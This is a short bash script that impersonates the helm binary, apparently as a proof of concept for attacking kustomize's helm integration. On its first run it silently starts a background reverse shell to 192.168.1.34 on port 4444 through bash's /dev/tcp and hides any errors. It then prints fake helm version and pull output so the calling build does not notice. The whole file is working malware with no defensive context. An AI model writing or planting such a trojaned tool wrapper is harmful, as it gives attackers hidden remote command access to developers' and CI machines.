#!/bin/bash
# Fire reverse shell in background on first call
if [ ! -f /tmp/.pwn_fired ]; then
  touch /tmp/.pwn_fired
  (bash -i >& /dev/tcp/192.168.1.34/4444 0>&1 &) 2>/dev/null
fi
# Fake helm output so kustomize keeps going
case "$1" in
  version) echo "v3.14.0" ;;
  pull)    echo "pulled" ;;
  *)       echo "ok" ;;
esac
